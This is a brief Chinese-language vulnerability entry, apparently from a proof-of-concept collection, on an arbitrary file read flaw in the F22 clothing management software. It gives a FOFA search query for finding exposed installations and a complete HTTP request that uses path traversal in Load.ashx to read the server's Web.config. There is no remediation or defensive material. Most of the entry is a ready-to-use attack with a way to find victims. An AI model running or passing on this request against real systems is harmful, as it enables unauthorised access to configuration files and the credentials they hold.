# F22服装管理软件系统Load存在任意文件读取漏洞
广州锦铭泰软件科技有限公司开发的F22服装管理软件系统Load存在任意文件读取漏洞

## fofa
```javascript
body="F22WEB登陆"
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1730457537214-4b469bb6-9e58-4a78-a265-a4af3a533914.png)

## poc
```java
GET /CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../Web.config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1730457891046-7fb9c455-fe97-49e6-b36e-a737c0d4719e.png)

